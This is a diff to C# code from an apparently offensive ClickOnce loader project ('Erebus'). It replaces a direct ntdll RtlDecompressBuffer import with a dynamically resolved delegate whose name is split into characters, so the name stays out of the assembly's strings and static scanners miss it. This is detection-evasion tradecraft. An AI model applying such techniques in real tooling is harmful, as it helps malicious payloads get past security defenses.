@@ -1,6 +1,7 @@
 using System.Runtime.InteropServices;
 using System.Text.RegularExpressions;
 using System.Text;
+using Erebus.ClickOnce.Evasion;
 
 namespace Erebus.ClickOnce
 {
@@ -191,7 +192,7 @@ namespace Erebus.ClickOnce
                 byte[] output = new byte[input.Length * 6];
                 uint uncompressedSize = 0;
 
-                int status = NtStatusHelper.RtlDecompressBuffer(
+                int status = NtStatusHelper.DoDecomp(
                     (ushort)2,
                     output,
                     (uint)output.Length,
@@ -202,7 +203,7 @@ namespace Erebus.ClickOnce
 
                 if (status != 0)
                 {
-                    DebugLogger.WriteLine($"[-] RtlDecompressBuffer failed with status: 0x{status:X8}");
+                    DebugLogger.WriteLine($"[-] decomp step failed with status: 0x{status:X8}");
                     return input;
                 }
 
@@ -340,18 +341,37 @@ namespace Erebus.ClickOnce
     }
 
     /// <summary>
-    /// Native method declarations for NTAPI functions
+    /// D/Invoke-resolved wrapper for ntdll!DoDecomp. The DLL
+    /// and function names are kept out of the assembly's #Strings heap
+    /// by going through DynamicApi.LazyDelegate.
     /// </summary>
     public static class NtStatusHelper
     {
-        [DllImport("ntdll.dll", SetLastError = false)]
-        public static extern int RtlDecompressBuffer(
-            ushort CompressionFormat,   // FIXED: ushort (0x0002 for LZNT1)
+        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
+        private delegate int FnRdb(
+            ushort CompressionFormat,
             byte[] uncompressedBuffer,
             uint uncompressedBufferSize,
             byte[] compressedBuffer,
             uint compressedBufferSize,
-            out uint finalUncompressedSize
-        );
+            out uint finalUncompressedSize);
+
+        private static readonly System.Lazy<FnRdb> _rtlDecomp =
+            DynamicApi.LazyDelegate<FnRdb>(
+                DynamicApi.Ntdll,
+                new[] { 'R', 't', 'l', 'D', 'e', 'c', 'o', 'm', 'p', 'r', 'e', 's', 's', 'B', 'u', 'f', 'f', 'e', 'r' });
+
+        public static int DoDecomp(
+            ushort CompressionFormat,
+            byte[] uncompressedBuffer,
+            uint uncompressedBufferSize,
+            byte[] compressedBuffer,
+            uint compressedBufferSize,
+            out uint finalUncompressedSize)
+            => _rtlDecomp.Value(
+                CompressionFormat,
+                uncompressedBuffer, uncompressedBufferSize,
+                compressedBuffer, compressedBufferSize,
+                out finalUncompressedSize);
     }
 }
